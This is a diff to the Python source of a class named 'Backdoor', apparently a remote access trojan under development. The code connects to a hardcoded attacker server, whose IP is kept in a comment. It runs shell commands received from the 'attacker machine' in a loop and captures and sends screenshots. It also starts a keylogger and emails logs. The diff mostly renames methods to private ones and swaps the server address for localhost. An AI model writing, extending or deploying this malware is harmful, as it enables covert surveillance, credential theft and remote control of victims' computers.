@@ -30,7 +30,7 @@ from Logger import Logger
 class Backdoor:
     NUMBER_OF_THREADS = 6
     JOB_NUMBER = [0, 3, 4, 6]
-    Ip = "20.101.135.232"  # 20.101.135.232
+    Ip = "127.0.0.1"  # 20.101.135.232
     NUMBER_OF_PORTS = 5
     MAX_PORT_VALUE = 65535
     MIN_PORT_VALUE = 49152
@@ -52,33 +52,33 @@ class Backdoor:
         self.__open_facade()
         self.connection = None
         self.logger = Logger(self.queue)
-        self.create_workers()
-        self.create_jobs()
+        self.__create_workers()
+        self.__create_jobs()
 
     # ****************** THREAD POOL ******************************************************************
 
     # Thread pool pattern makes it easy to observe and manage threads
     # Reduces the costs occur when creating and deleting threads
 
-    def create_workers(self):
+    def __create_workers(self):
         for _ in range(self.NUMBER_OF_THREADS):
-            t = threading.Thread(target=self.work)
+            t = threading.Thread(target=self.__work)
             t.daemon = True
             t.start()
 
-    def work(self):
+    def __work(self):
 
         while True:
             x = self.queue.get()
 
             if x == 0:
-                self.randomize_ports()
+                self.__randomize_ports()
 
             elif x == 1:
-                self.connect_to_server()
+                self.__connect_to_server()
 
             elif x == 2:
-                self.command_executor()
+                self.__command_executor()
 
             elif x == 3:
                 self.logger.key_logger()
@@ -90,21 +90,21 @@ class Backdoor:
                 self.logger.send_email()
 
             elif x == 6:
-                self.check_date()
+                self.__check_date()
 
             elif x == 7:
                 self.logger.track_event()
 
             self.queue.task_done()
 
-    def create_jobs(self):
+    def __create_jobs(self):
         for x in self.JOB_NUMBER:
             self.queue.put(x)
         self.queue.join()
 
     # ****************** THREAD POOL ******************************************************************
 
-    def randomize_ports(self):
+    def __randomize_ports(self):
 
         date_time = datetime.datetime.now()
         current_day = date_time.day
@@ -118,7 +118,7 @@ class Backdoor:
 
         self.queue.put(1)
 
-    def check_date(self):
+    def __check_date(self):
 
         last_time = datetime.datetime.now()
         last_day = last_time.day
@@ -137,7 +137,7 @@ class Backdoor:
             time.sleep(60)
             self.is_date_changed = False
 
-    def connect_to_server(self):
+    def __connect_to_server(self):
 
         succeeded = False
         retry_interval = 5
@@ -158,7 +158,7 @@ class Backdoor:
                 time.sleep(retry_interval)
 
     # Execute given command string in shell
-    def execute_system_command(self, command: list):
+    def __execute_system_command(self, command: list):
 
         command = " ".join(command)
 
@@ -251,14 +251,13 @@ class Backdoor:
             pass
 
     # Here we are waiting commands from attacker machine in an infinite loop
-    def command_executor(self):
+    def __command_executor(self):
 
         while True:
 
             command_result = ""
 
             try:
-                # Wait (This is a blocking code) command string from attacker
                 command: list = self.__receive_data()
             except ConnectionError as msg:
                 print(msg)
@@ -276,7 +275,7 @@ class Backdoor:
                     if len(command) > 1:
                         command_result = self.__change_working_directory_to(command[1])
                     else:
-                        command_result = self.execute_system_command(command)
+                        command_result = self.__execute_system_command(command)
                     self.__send_data(command_result)
 
                 except Exception as e:
@@ -303,8 +302,6 @@ class Backdoor:
 
             # Take a screenshot and send it to attacker
             elif command[0] == "screenshot":
-
-                # TODO Get screenshot from all clients
 
                 image = self.logger.get_screenshot()
                 image = base64.b64encode(image).decode()
@@ -340,7 +337,7 @@ class Backdoor:
 
             # Execute other builtin commands
             else:
-                command_result = self.execute_system_command(command)
+                command_result = self.__execute_system_command(command)
                 self.__send_data(command_result)
 
 
